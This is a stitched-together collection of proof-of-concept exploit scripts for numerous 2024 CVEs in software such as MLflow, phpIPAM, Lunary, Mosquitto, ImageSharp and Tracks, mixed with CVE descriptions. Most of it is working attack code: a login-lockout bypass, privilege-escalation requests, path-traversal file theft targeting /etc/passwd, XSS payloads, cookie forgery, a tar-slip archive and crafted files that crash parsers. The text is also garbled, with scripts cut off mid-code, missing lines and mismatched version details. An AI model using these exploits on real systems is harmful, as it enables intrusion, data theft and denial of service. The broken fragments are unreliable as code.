CWE: [{'id': 'CWE-23', 'value': 'CWE-23 Relative Path Traversal'}]
Description: A vulnerability in mlflow/mlflow version 8.2.1 allows for remote code execution due to improper neutralization of special elements used in an OS command ('Command Injection') within the `mlflow.data.http_dataset_source.py` module. Specifically, when loading a dataset from a source URL with an HTTP scheme, the filename extracted from the `Content-Disposition` header or the URL path is used to generate the final file path without proper sanitization. This flaw enables an attacker to control the file path fully by utilizing path traversal or absolute path techniques, such as '../../tmp/poc.txt' or '/tmp/poc.txt', leading to arbitrary file write. Exploiting this vulnerability could allow a malicious user to execute commands on the vulnerable machine, potentially gaining access to data and mode

#!/usr/bin/env python3
"""
PoC exploit for CVE-2024-0520 (MLflow ≤ 2.8.1)

INPUT FORMAT:
    python exploit.py <url>

Where <url> is the HTTP/HTTPS address of an attacker-controlled dataset
server that returns a malicious `Content-Disposition` header containing an
absolute path or path-traversal sequences.  Example value that triggers the
vulnerability using the provided malicious_server.py:

    python exploit.py http://127.0.0.1:4444
"""
import sys
import pandas as pd
import mlflow.data
from mlflow.data.pandas_dataset import PandasDataset

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <url>")
    sys.exit(1)

dataset_source_url = sys.argv[1]

print(f"[*] Reading CSV from server at {dataset_source_url} …")
df = pd.read_csv(dataset_source_url)
print("[*] First rows of data received:\n", df.head())

print("[*] Logging dataset via MLflow …")
dataset: PandasDataset = mlflow.data.from_pandas(df, source=dataset_source_url)
with mlflow.start_run() as run:
    mlflow.log_input(dataset, context="training")
    run_id = run.info.run_id

print("[*] Invoking HTTPDatasetSource.load(), this triggers the vulnerable code …")
dataset_info = mlflow.get_run(run_id).inputs.dataset_inputs[0].dataset
dataset_source = mlflow.data.get_source(dataset_info)
loaded_path = dataset_source.load()

print(f"[+] Exploit complete. Dataset forcibly written to: {loaded_path}")

#!/usr/bin/env python3
"""
PoC for CVE-2024-0787 – phpIPAM 1.6.1 lockout bypass
Usage:
    python3 exploit.py <PASSWORD>

Argument:
    PASSWORD – the password value that will be sent in the repeated login attempts.
               Use a wrong value (e.g. ‘test’) to demonstrate unlimited attempts.

The script performs 10 login attempts against
    http://127.0.0.1:8000/app/login/login_check.php
and supplies a unique X-Forwarded-For IP on every request, bypassing
the 5-failures-per-IP lockout.
"""

import sys, requests

url = "http://127.0.0.1:8000/app/login/login_check.php"
password = sys.argv[1] if len(sys.argv) > 1 else "test"

sess = requests.Session()

for i in range(10):                                     # 10 consecutive attempts
    fake_ip = f"192.0.2.{i+1}"                          # rotate header each time
    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = f"ipamusername=Admin&ipampassword={password}"
    requests.post(url, headers=headers, data=data, cookies=sess.cookies, allow_redirects=False)

print("Sent 10 login attempts with unique X-Forwarded-For headers – lockout bypass triggered.")

#!/usr/bin/env python3
"""
CVE-2024-10273 – Privilege-escalation Patch exploit for Lunary ≤1.5.6

INPUT FORMAT
=============
python exploit.py <base_url> <jwt_token> <model_id> <json_payload>

  base_url     : root of the vulnerable API, e.g. http://localhost:3333
  jwt_token    : Bearer token of a LOW-privilege user (viewer/member/etc)
  model_id     : UUID of the target model (obtainable via GET /v1/models)
  json_payload : JSON string with fields to overwrite, e.g. '{"name":"pwned"}'

EXAMPLE THAT TRIGGERS THE VULNERABILITY
---------------------------------------
python exploit.py http://localhost:3333 \
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... \
  16156bdf-d575-494a-bdd8-bbef37baf6ea \
  '{"name":"CompromisedByLowPriv","inputCost":0,"outputCost":0}'
"""

import json
import sys
import urllib.request

def main():
    if len(sys.argv) != 5:
        print("Usage: exploit.py <base_url> <jwt> <model_id> <json_payload>")
        sys.exit(1)

    base_url, jwt, model_id, payload_str = sys.argv[1:]
    try:
        payload = json.loads(payload_str)
    except json.JSONDecodeError as e:
        print("Invalid JSON payload:", e)
        sys.exit(1)

    url = f"{base_url.rstrip('/')}/v1/models/{model_id}"
    data = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method="PATCH")
    req.add_header("Authorization", f"Bearer {jwt}")
    req.add_header("Content-Type", "application/json")

    try:
        with urllib.request.urlopen(req) as resp:
            print("HTTP", resp.status)
            print(resp.read().decode())
    except urllib.error.HTTPError as e:
        print("Error:", e.code, e.read().decode())

if __name__ == "__main__":
    main()

"""
PoC for CVE-2024-10274 – Improper Authorization in Lunary v1.5.6

INPUT FORMAT:
    exploit.py <JWT> [<base_url>]

Arguments:
    <JWT>       The bearer JSON-Web-Token for ANY authenticated user. The user
                can have the lowest privilege (e.g. role "viewer").
    <base_url>  (optional) Root URL of the Lunary backend. Defaults to

SPECIFIC INPUT REQUIRED TO TRIGGER THE VULNERABILITY:
    Supply a valid JWT issued by the vulnerable server. Example obtained via:
        curl -X POST http://localhost:3333/auth/login \
             -H 'Content-Type: application/json' \

Running the script with that JWT will invoke the unprotected endpoint
GET /v1/users/me/org and print the leaked organization roster that should
only be visible to admins/owners.

import sys
import json
import requests

DEF_BASE = "http://localhost:3333"

Description: In version 1.5.5 of lunary-ai/lunary, a vulnerability exists where admins, who do not have direct permissions to access billing resources, can change the permissions of existing users to include billing permissions. This can lead to a privilege escalation scenario where an administrator can manage billing, effectively bypassing the intended role-based access control. Only users with the 'owner' role should be allowed to invite members with billing permissions. This flaw allows admins to circumvent those restrictions, gaining unauthorized access and control over billing information, posing a risk to the organization’s financial resources.

#!/usr/bin/env python3
"""
CVE-2024-10275 Proof-of-Concept  –  lunary v1.5.6
-------------------------------------------------
Usage:
    python exploit.py <unique_tag>

<unique_tag> can be any string and is appended to the temporary e-mail
addresses so the exploit can be run multiple times against the same database.

The script performs:
1. Owner signup (new organisation).
2. Owner invites an admin and completes the invite.
3. Direct SQL: UPDATE org SET plan='custom'  (bypass plan gate, dev only).
4. Admin invites a member (victim) and immediately PATCHes the victim to
   role = "billing".
If the backend is vulnerable the PATCH returns HTTP 200.
"""

import base64, json, random, string, subprocess, sys
from urllib.parse import urljoin
import requests

API_BASE = "http://localhost:3333"
if len(sys.argv) != 2:
    print("Usage: python exploit.py <unique_tag>")
    sys.exit(1)
TAG = sys.argv[1]

rand = lambda: "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
OWNER_EMAIL  = f"owner_{TAG}_{rand()}@corp.com"
ADMIN_EMAIL  = f"admin_{TAG}_{rand()}@corp.com"
VICTIM_EMAIL = f"victim_{TAG}_{rand()}@corp.com"
PASSWORD = "Passw0rd!"
s = requests.Session()

def decode(jwt):
    body = jwt.split(".")[1] + "==="  # pad
    return json.loads(base64.urlsafe_b64decode(body))

def psql(cmd):
    subprocess.run(
        ["sudo", "-u", "postgres", "psql", "-d", "lunary_dev", "-c", cmd],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

# 1. owner signup
print(f"[*] Creating owner account: {OWNER_EMAIL}")
r = s.post(urljoin(API_BASE, "/auth/signup"), json={
    "email": OWNER_EMAIL, "password": PASSWORD, "name": "Owner",
    "signupMethod": "signup", "orgName": "ExploitOrg", "projectName": "ExploitProj"
}); r.raise_for_status()
owner_tok = r.json()["token"]
org_id = decode(owner_tok)["orgId"]

# project id
project_id = s.get(urljoin(API_BASE, "/v1/projects"),
                   headers={"Authorization": f"Bearer {owner_tok}"}).json()[0]["id"]

# 2. invite admin
print("[*] Inviting admin user")
inv = s.post(urljoin(API_BASE, "/v1/users"),
             headers={"Authorization": f"Bearer {owner_tok}"},
             json={"email": ADMIN_EMAIL, "role": "admin", "projects": [project_id]}
            ).json()["user"]["singleUseToken"]
# complete admin signup
s.post(urljoin(API_BASE, "/auth/signup"), json={
    "email": ADMIN_EMAIL, "password": PASSWORD, "name": "Admin",
    "signupMethod": "join", "token": inv, "orgId": org_id
}).raise_for_status()
admin_tok = s.post(urljoin(API_BASE, "/auth/login"),
                   json={"email": ADMIN_EMAIL, "password": PASSWORD}).json()["token"]

# 3. bypass plan gate
print("[*] Switching org plan to 'custom'")
psql(f"UPDATE org SET plan='custom' WHERE id='{org_id}';")

# 4. admin invites victim
print("[*] Admin inviting victim")
victim = s.post(urljoin(API_BASE, "/v1/users"),
                headers={"Authorization": f"Bearer {admin_tok}"},
                json={"email": VICTIM_EMAIL, "role": "member", "projects": [project_id]}
               ).json()["user"]["id"]

# 5. exploit – escalate to billing
print("[*] Admin PATCH /v1/users/{victim} → billing")
resp = s.patch(urljoin(API_BASE, f"/v1/users/{victim}"),
               headers={"Authorization": f"Bearer {admin_tok}"},
               json={"role": "billing", "projects": [project_id]})
print("    ↳ HTTP", resp.status_code)
if resp.status_code == 200:
    print("[+] Exploit successful — admin could assign 'billing' role!")
else:
    print("[-] Exploit failed:", resp.text)

#!/usr/bin/env python3
"""
Exploit PoC for CVE-2024-10525 – Eclipse Mosquitto libmosquitto SUBACK
Heap-based Buffer Overflow.

USAGE:
    python3 exploit.py <PORT>

INPUT FORMAT:
    <PORT> – TCP port number to listen on (e.g. 1884).  The script
    starts a minimal MQTT broker that replies with a malicious SUBACK
    lacking reason-code bytes.  Any mosquitto_sub (≤2.0.18) that
    connects to this port and performs a SUBSCRIBE will crash.

EXAMPLE TO TRIGGER:
    # terminal 1 (start malicious broker)
    python3 exploit.py 1884

    # terminal 2 (vulnerable client built from this tree)
    LD_LIBRARY_PATH=./lib ./client/mosquitto_sub -h 127.0.0.1 -p 1884 -t test
"""
import socket, sys, time, struct

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 1884

with socket.socket() as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, _ = s.accept()
    with conn:
        # 1. RECEIVE CONNECT (ignore contents)
        conn.recv(1024)

        # 2. SEND CONNACK  (Session Present=0, Return Code=0)
        conn.send(b"\x20\x02\x00\x00")

        # 3. RECEIVE SUBSCRIBE
        sub = conn.recv(1024)
        if len(sub) < 4:
            sys.exit("Client did not send SUBSCRIBE")
        pkt_id = sub[2:4]           # bytes 2-3 = Packet Identifier

        # 4. SEND MALFORMED SUBACK (RemainingLength=2, no reason codes)
        conn.send(b"\x90\x02" + pkt_id)

        # keep connection briefly so client processes packet
        time.sleep(1)

"""
phpIPAM 1.6.1 – CVE-2024-10718 proof-of-concept

Usage:
    python3 exploit.py <host> <cookie_pair>

Arguments:
    host         Target host (without scheme), e.g. "localhost"
    cookie_pair  The cookie key=value string that was issued over HTTPS,
                 e.g. "phpipam=uqfs8tj0ibqd7gp77bi0oebff9"

"""
Exploit PoC for CVE-2024-11301 (lunary ≤ 1.6.2)

INPUT FORMAT
    python exploit.py <PRIVATE_API_KEY> [SLUG]

    PRIVATE_API_KEY : the project's private_api_key (required).
    SLUG            : evaluator slug to duplicate (default: "exploit-dup").

The script sends TWO consecutive POST requests with the same
(project_id, slug) to /v1/evaluators, followed by a GET to show
duplicate/overwritten rows.  A vulnerable server will return at least
two evaluator objects that share the same slug.
"""

import sys, json, requests, random, string, time

def rand_name(prefix):
    return prefix + "".join(random.choices(string.ascii_lowercase, k=5))

def main():
    if len(sys.argv) < 2:
        print("usage: exploit.py <PRIVATE_API_KEY> [SLUG]")
        sys.exit(1)

    key  = sys.argv[1]
    slug = sys.argv[2] if len(sys.argv) > 2 else "exploit-dup"

    url  = "http://localhost:3333/v1/evaluators"
    hdr  = {"Content-Type": "application/json", "x-api-key": key}

    body1 = {
        "slug": slug,
        "name": rand_name("orig-"),
        "type": "geval",
        "mode": "normal",
        "params": {},
        "filters": []
    }
    body2 = {
        "slug": slug,
        "name": rand_name("evil-"),
        "type": "geval",
        "mode": "normal",
        "params": {"p": "mali"},
        "filters": ["AND", {"f": "mali"}]
    }

    # first insert
    r1 = requests.post(url, headers=hdr, data=json.dumps(body1), timeout=5)
    print("[+] first POST status", r1.status_code)

    time.sleep(0.2)          # tiny delay

    # second insert with same slug
    r2 = requests.post(url, headers=hdr, data=json.dumps(body2), timeout=5)
    print("[+] second POST status", r2.status_code)

    # final list
    lst = requests.get(url, headers=hdr, timeout=5).json()
    dup = [e for e in lst if e.get("slug") == slug]
    print(f"[+] found {len(dup)} evaluators with slug '{slug}' (should be >=2 on a vulnerable build)")

  • starts a local HTTP file-server on 127.0.0.1:8000 (override via $FILESERVER_PORT);
  • issues POST /api/v2/models/install?source=http://127.0.0.1:8000/payload.ckpt&inplace=true

import http.server, socketserver, threading, time, pickle, os, sys, requests

INVOKEAI_HOST = os.environ.get("INVOKEAI_HOST", "127.0.0.1")
INVOKEAI_PORT = int(os.environ.get("INVOKEAI_PORT", "9090"))
FILESERVER_PORT = int(os.environ.get("FILESERVER_PORT", "8000"))

INPUT FORMAT (command-line):
    python3 exploit.py <victim_qname> <malicious_owner> [port]

    <victim_qname>   – the QNAME that a dnsjava 3.5.3 client will query
    <malicious_owner>– the owner name to inject in the forged SRV RR
    [port]           – UDP port to listen on (default 5533)

SPECIFIC INPUT REQUIRED TO TRIGGER THE VULNERABILITY (example):
    python3 exploit.py example.com. attacker.com.

After the resolver starts, run the vulnerable dnsjava client, e.g.:
    java -cp target/dnsjava-3.5.3.jar:<slf4j> org.xbill.DNS.tools.dig \
        @127.0.0.1 example.com SRV -p5533
which will return the attacker.com SRV record, proving the bypass.

The script only sets up a minimal malicious DNS resolver that injects the
additional SRV RR.  It does not attempt to verify or capture the exploit
result.

import socket, sys
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, RCODE, SRV

LISTEN_IP = '127.0.0.1'

def main():

        print('Usage: %s <victim_qname> <malicious_owner> [port]' % sys.argv[0])

    fake_owner = sys.argv[2]

    port = int(sys.argv[3]) if len(sys.argv) > 3 else 5533

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

          f'    • targets QNAME: {victim}\n'

        try:
            req = DNSRecord.parse(data)
        except Exception:
            continue
        q = req.q
        if QTYPE[q.qtype] == 'SRV' and str(q.qname).lower() == victim.lower():
            resp = DNSRecord(DNSHeader(id=req.header.id, qr=1, aa=1, ra=1, ad=1), q=q)
            # priority 0, weight 5, port 443, target=fake_owner
            resp.add_answer(RR(fake_owner, QTYPE.SRV, rdata=SRV(0, 5, 443, fake_owner), ttl=3600))

#!/usr/bin/env python3
"""
PoC for CVE-2024-2914 (TarSlip in DJL 0.26.0)

INPUT  : single command-line argument – the text payload to be written
EXAMPLE: python3 exploit.py "OWNED_BY_EXPLOIT"

The script:
1. builds a malicious gzip tarball whose member name is "../pwned.txt";
2. serves it over HTTP on 127.0.0.1:8000;
3. invokes extensions.spark.setup.djl_spark.util.files_util.download_and_extract()
   to download & extract the archive into ./tmp_spark;
4. extractall() writes the payload into ./pwned.txt (outside tmp_spark).
"""
import io, os, sys, tarfile, types, threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

def build_malicious_tar(tar_path: Path, payload: bytes):
    with tarfile.open(tar_path, "w:gz") as tar:
        info = tarfile.TarInfo("../pwned.txt")   # path traversal
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))

def start_http_server(directory: Path, port: int = 8000):
    httpd = HTTPServer(("127.0.0.1", port), SimpleHTTPRequestHandler)
    def _serve():
        os.chdir(directory)
        httpd.serve_forever()
    threading.Thread(target=_serve, daemon=True).start()
    return httpd

def main():

        sys.exit(1)

    out  = root / "tmp_spark"   ; out.mkdir(exist_ok=True)

    from extensions.spark.setup.djl_spark.util.files_util import download_and_extract

from urllib.parse import quote
from itsdangerous import URLSafeTimedSerializer
import requests

TARGET = "http://localhost:40000"      # change if the server listens elsewhere

def forge_cookie():
    signer = URLSafeTimedSerializer(
        "Dtale",
        salt="cookie-session",
        signer_kwargs={"key_derivation": "hmac",
                       "digest_method": hashlib.sha1},
    )
    return signer.dumps({"logged_in": True, "username": "attacker"})

def main():

        sys.exit(1)

"""
PoC for CVE-2024-36400 – nano-id v0.3.3 entropy reduction

INPUT FORMAT
-------------
python exploit.py <mode> [iterations]

<mode>       : "base58" or "base62" (case-insensitive)
[iterations] : optional, number of IDs to generate (default 100000)

SPECIFIC INPUT REQUIRED
-----------------------
Running

    python exploit.py base62

is enough to trigger the vulnerability; it shows that only 32 symbols are
ever generated from the 62-character alphabet.
"""
import os
import sys

BASE58_ALPHABET = b"ModueSymbhaswnPr123456789ABCDEFGHNRVfgctiUvzKqYTJkLxpZXjQW"
BASE62_ALPHABET = b"ModuleSymbhasOwnPr0123456789ABCDEFGHNRVfgctiUvzKqYTJkLxpZXIjQW"

def vulnerable_nanoid(alphabet: bytes, length: int = 10) -> str:
    """Faithful re-implementation of nano-id v0.3.3’s vulnerable algorithm."""
    mask = len(alphabet) - 1          # root cause
    rand_bytes = bytearray(os.urandom(length))
    for i, b in enumerate(rand_bytes):
        rand_bytes[i] = alphabet[b & mask]
    return rand_bytes.decode()

        print("Usage: python exploit.py <base58|base62> [iterations]")
        sys.exit(1)

    mode = sys.argv[1].lower()
    iterations = int(sys.argv[2]) if len(sys.argv) > 2 else 100_000

    if mode == "base58":
        alphabet = BASE58_ALPHABET
    elif mode == "base62":
        alphabet = BASE62_ALPHABET
    else:
        print("Unsupported mode. Use 'base58' or 'base62'.")
        sys.exit(1)

    produced = set()
    for _ in range(iterations):
        produced.update(vulnerable_nanoid(alphabet))

    print(f"Alphabet size declared : {len(alphabet)}")
    print(f"Unique symbols produced: {len(produced)}")

#!/usr/bin/env python3
"""
CVE-2024-37168 PoC – wire-size over-limit exploit for @grpc/grpc-js ≤1.10.8

INPUT FORMAT
=============
    python exploit.py <MESSAGE_SIZE>

    • <MESSAGE_SIZE> – integer; payload bytes to declare/send.  
      Must exceed the server’s grpc.max_receive_message_length to trigger
      the vulnerability.

Example that works against the bundled repro server (limit = 1000):

    python exploit.py 50000
"""
import sys
import socket
from h2.connection import H2Connection
from h2.config import H2Configuration

HOST = "localhost"
PORT = 50051


def die(msg: str):
    print(msg, file=sys.stderr)
    sys.exit(1)


def main():
    if len(sys.argv) != 2:
        die("Usage: python exploit.py <MESSAGE_SIZE>")
    try:
        size = int(sys.argv[1])
    except ValueError:
        die("MESSAGE_SIZE must be an integer")

    cfg = H2Configuration(client_side=True, header_encoding="utf-8")
    conn = H2Connection(config=cfg)
    sock = socket.create_connection((HOST, PORT))

    # 1. Send HTTP/2 client preface + SETTINGS
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # 2. Receive server SETTINGS and ACK them
    data = sock.recv(65535)
    if data:
        conn.receive_data(data)
        sock.sendall(conn.data_to_send())

    # 3. Open stream and send gRPC request HEADERS
    stream_id = conn.get_next_available_stream_id()
    headers = [
        (":method", "POST"),
        (":scheme", "http"),
        (":path", "/TestService/Unary"),
        (":authority", "localhost"),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
    ]
    conn.send_headers(stream_id, headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # 4. Build oversized framed gRPC message (flag + 4-byte length + payload)
    framed = bytes([0]) + size.to_bytes(4, "big") + b"\0" * size

    # 5. Send DATA frames respecting MAX_FRAME_SIZE
    max_frame = conn.max_outbound_frame_size
    for pos in range(0, len(framed), max_frame):
        chunk = framed[pos : pos + max_frame]
        end = (pos + max_frame) >= len(framed)
        conn.send_data(stream_id, chunk, end_stream=end)
        sock.sendall(conn.data_to_send())

    # 6. Drain and print response events
    try:
        while True:
            data = sock.recv(65535)
            if not data:
                break
            events = conn.receive_data(data)
            for ev in events:
                print("EVENT:", ev)
                if ev.__class__.__name__ in ("StreamEnded", "StreamReset"):
                    raise SystemExit
    except SystemExit:
        pass
    finally:
        sock.close()


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""
CVE-2024-40630 ‑ OpenImageIO HEIF reader heap OOB read PoC

Input format:
    python3 exploit.py <original.heic> <inflated_width> <inflated_height>

Example that reliably crashes the vulnerable OIIO 2.5.13.0 build shipped with
this lab:

    python3 exploit.py testsuite/heif/ref/IMG_7702_small.heic 32000 32000

The script:
  • copies the supplied HEIC, overwrites the width/height fields of the first
    ‘ispe’ box with the user-supplied values, creating "<basename>_evil.heic";
  • sets ASAN_OPTIONS (so AddressSanitizer aborts immediately); and
  • runs the vulnerable build/bin/oiiotool to read the image and write a dummy
    /tmp/out.jpg, which triggers the heap-buffer-overflow inside
    HeifInput::read_native_scanline().

No crash handling or verification code is included – running the script is
enough to exercise the vulnerability.
"""
import os, sys, struct, subprocess, shutil, pathlib, tempfile

def inflate_ispe(src, dst, w, h):
    data = bytearray(open(src, 'rb').read())
    off = data.find(b'ispe')
    if off == -1:
        raise RuntimeError('ispe box not found')
    # ispe+4 = version/flags, then 4-byte width, 4-byte height
    data[off+8:off+12] = struct.pack('>I', w)
    data[off+12:off+16] = struct.pack('>I', h)
    open(dst, 'wb').write(data)

def main():
    if len(sys.argv) != 4:
        print(f'usage: {sys.argv[0]} <file.heic> <width> <height>')
        sys.exit(1)

    src = pathlib.Path(sys.argv[1]).expanduser().resolve()
    width, height = int(sys.argv[2]), int(sys.argv[3])
    dst = src.with_name(src.stem + '_evil.heic')

    inflate_ispe(src, dst, width, height)

    env = os.environ.copy()
    env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
    oiio = pathlib.Path('build/bin/oiiotool').resolve()
    out = tempfile.gettempdir() + '/out.jpg'

    subprocess.run([str(oiio), str(dst), '-o', out], env=env, check=False)

if __name__ == '__main__':
    main()

"""
PoC for CVE-2024-41124 (puncia v0.20 clear-text HTTP)

Input format:
    python3 exploit.py <domain> [APIKEY]

    <domain>   – domain that will be queried with `puncia subdomain`
    [APIKEY]   – optional; if given it is stored so it appears in the URL,
                 proving that sensitive data is leaked.

Example that triggers the vulnerability:
    python3 exploit.py example.com TESTKEY
"""
import sys, os, threading, socketserver, subprocess

PORT = 8080

class ProxyHandler(socketserver.StreamRequestHandler):
    def handle(self):
        # read request headers
        data = b""
        while True:
            line = self.rfile.readline()
            data += line
            if line in (b"\r\n", b"\n", b""):
                break
        print("===== Intercepted Request =====")
        print(data.decode(errors="replace"))
        print("===============================")
        # send minimal JSON body so puncia continues
        body = b'["owned.by.attacker"]\n'
        resp = (b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/json\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n") + body
        self.wfile.write(resp)
        self.wfile.flush()

class ThreadedServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def start_proxy():
    server = ThreadedServer(("127.0.0.1", PORT), ProxyHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

def main():

        print("Usage: python3 exploit.py <domain> [APIKEY]")
        sys.exit(1)

    key = sys.argv[2] if len(sys.argv) > 2 else None

    os.environ["http_proxy"] = f"http://127.0.0.1:{PORT}"

    if key:
        subprocess.run([sys.executable, "-m", "puncia", "storekey", key], check=True)
    subprocess.run([sys.executable, "-m", "puncia", "subdomain", domain])

    srv.shutdown()

if __name__ == "__main__":

"""
CVE-2024-41131 – SixLabors.ImageSharp GIF LZW ‘min code size’ out-of-bounds write / DoS

INPUT FORMAT:
    python exploit.py <gif_path>

    <gif_path> : Path where the crafted payload GIF is/will be stored.
                 If the file does not exist the script automatically
                 creates a minimal malicious GIF with an LZW minimum
                 code size byte of 0x0D (13).

WHAT THE SCRIPT DOES:
    1. Ensures the supplied file is a malicious GIF (creates it when
       necessary).
    2. Launches the vulnerable sample application located at
       “/tmp/GifCvePoC” (built against ImageSharp 2.1.8) via:
           dotnet run --project /tmp/GifCvePoC -- <gif_path>
    3. The vulnerable LzwDecoder crashes with
       SixLabors.ImageSharp.InvalidImageContentException, demonstrating
       the denial-of-service condition.

No further interaction is required – running the script triggers the
vulnerability automatically.
"""
import os
import struct
import subprocess
import sys

def craft_payload(path: str):
    """Write a 1×1 GIF whose LZW minimum code size is 13 (>12)."""
    width, height = 1, 1
    header = b"GIF89a"
    # Logical Screen Descriptor: size + GCT flag (1 << 7) + 1-bit depth table (0)
    lsd = struct.pack("<HHBBB", width, height, 0x80 | 0x70 | 0x00, 0, 0)
    # Global color table – 2 RGB triplets
    gct = b"\x00\x00\x00" + b"\xff\xff\xff"
    # Image Descriptor
    img_desc = b"," + struct.pack("<HHHHB", 0, 0, width, height, 0)
    # Image Data: minCodeSize=13 (0x0D) + one data sub-block with a single 0x00 byte + block terminator 0x00
    img_data = b"\x0d" + b"\x01\x00" + b"\x00"
    trailer = b";"
    data = header + lsd + gct + img_desc + img_data + trailer
    with open(path, "wb") as f:
        f.write(data)

def main():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py <gif_path>")
        sys.exit(1)

    gif_path = sys.argv[1]

    # If the file does not exist, create malicious payload
    if not os.path.exists(gif_path):
        craft_payload(gif_path)
        print(f"[+] Malicious GIF written to {gif_path}")

    print("[+] Launching vulnerable decoder …")
    result = subprocess.run([
        "dotnet", "run", "--project", "/tmp/GifCvePoC", "--", gif_path
    ], capture_output=True, text=True)

    print("--- decoder stdout ---")
    print(result.stdout)
    print("--- decoder stderr ---")
    print(result.stderr)
    print(f"[+] Process exit code: {result.returncode}")

#  CVE-2024-41132  –  ImageSharp GIF decoder memory-exhaustion
#
#  INPUT FORMAT:
#      python exploit.py <output_gif_path> [dimension]
#
#      <output_gif_path> : filename the malicious GIF will be written to.
#      [dimension]       : (optional) 16-bit value to use for both Width and
#                          Height (default 65535).  Values in the tens of
#                          thousands already exhaust memory; the maximum legal
#                          value 65535 fully triggers the vulnerability.
#
#  EXAMPLE (recommended):
#      python exploit.py crafted.gif
#
#  The resulting GIF, when decoded with SixLabors.ImageSharp up to v2.1.8,
#  forces the library to allocate an unbounded 2-D buffer (~Width×Height bytes),
#  quickly exhausting process memory and causing denial of service.
#
import base64
import sys

MIN_ARGS = 2
if len(sys.argv) < MIN_ARGS:
    print("Usage: exploit.py <output_gif_path> [dimension]")
    sys.exit(1)

outfile = sys.argv[1]
dim     = int(sys.argv[2]) if len(sys.argv) > 2 else 65535
if not (1 <= dim <= 65535):
    print("dimension must be in [1,65535]")
    sys.exit(1)

# Minimal transparent 1×1 GIF in base64
MIN_GIF_B64 = "R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw=="
data = bytearray(base64.b64decode(MIN_GIF_B64))

# Locate the Image-Descriptor (0x2C)
idx = data.find(b'\x2C')
if idx == -1:
    raise RuntimeError("Unable to locate Image Descriptor (0x2C) in template GIF")

# Write little-endian Width and Height
low  = dim & 0xFF
high = (dim >> 8) & 0xFF
data[idx + 5] = low   # width low byte
data[idx + 6] = high  # width high byte
data[idx + 7] = low   # height low byte
data[idx + 8] = high  # height high byte

"""
Tracks 2.7.0 reflected XSS PoC  (CVE-2024-41805)

USAGE:
    python exploit.py "<payload>"

EXAMPLES that trigger the alert popup in the victim’s browser:
    python exploit.py "');alert(document.domain);//"
    python exploit.py "<script>alert(1)</script>"     (stats view)

The script:
  • logs into the local Tracks instance on http://localhost:3000
    with the seeded admin/password account,
  • URL-encodes the payload and requests the vulnerable /todos/tag page,
  • prints “VULNERABLE” when the payload is reflected and
    saves the full HTML to /tmp/tracks_xss.html for manual inspection.
"""

import re, sys, urllib.parse, requests, html, os

BASE = "http://localhost:3000"
USER, PWD = "admin", "password"

def get_token(session):
    r = session.get(f"{BASE}/login")
    m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
    return m.group(1) if m else ""

def login(session):
    tok = get_token(session)
    data = {
        "user_login": USER,
        "user_password": PWD,
        "authenticity_token": tok,
        "commit": "login"
    }
    r = session.post(f"{BASE}/login", data=data, allow_redirects=False)
    # follow redirect to establish session
    loc = r.headers.get("location", "/")
    session.get(loc if loc.startswith("http") else BASE + loc)

def exploit(payload):
    s = requests.Session()
    login(s)
    # Use the simpler /todos/tag/<payload> vector
    target = f"{BASE}/todos/tag/{urllib.parse.quote(payload, safe='')}"
    print("[*] requesting", target)
    r = s.get(target)
    open("/tmp/tracks_xss.html", "w").write(r.text)
    if payload.strip()[:20].replace("'", "'") in r.text or payload in r.text:
        print("[+] VULNERABLE – payload reflected, output saved to /tmp/tracks_xss.html")
    else:
        print("[-] exploit failed (payload not reflected)")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("usage: exploit.py \"<payload>\"")
        sys.exit(1)

)

proc.stdin.close()
ret = proc.wait()

#!/usr/bin/env python3
"""
PoC exploit for CVE-2024-42485 (pxlrbt/filament-excel <= v2.3.2)

USAGE:
    python3 exploit.py <target_base_url> <absolute_file_path>

Arguments:
    target_base_url     Base URL of the vulnerable Laravel application,
                        e.g. http://127.0.0.1:8000
    absolute_file_path  Absolute path on the server to download, e.g. /etc/passwd

The script tests traversal depths 6–15.  The first response that does not
start with HTML is assumed to be the target file and is written to stdout.
"""
import sys, urllib.request

def build_traversal(target_path: str, depth: int) -> str:
    traversal = "../" * depth + target_path.lstrip('/')
    return traversal.replace("../", "%2e%2e/")  # URL-encode ".."

def fetch(url: str):
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.read()
    except urllib.error.HTTPError as e:
        # Laravel may return 500 after sending the file (unlink() fails).
        if e.fp is not None:
            return e.fp.read()
        raise

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_base_url> <absolute_file_path>")
        sys.exit(1)

    base = sys.argv[1].rstrip('/')
    target_file = sys.argv[2]

    for depth in range(6, 16):          # try several depths
        payload = build_traversal(target_file, depth)
        url = f"{base}/filament-excel/{payload}"
        data = fetch(url)
        if data and not data.lstrip().startswith(b'<!DOCTYPE'):
            sys.stdout.buffer.write(data)
            return
    print("[-] Exploit failed", file=sys.stderr)
    sys.exit(2)

if __name__ == "__main__":
    main()

CWE: [{'id': 'CWE-23', 'value': 'CWE-23: Relative Path Traversal'}]
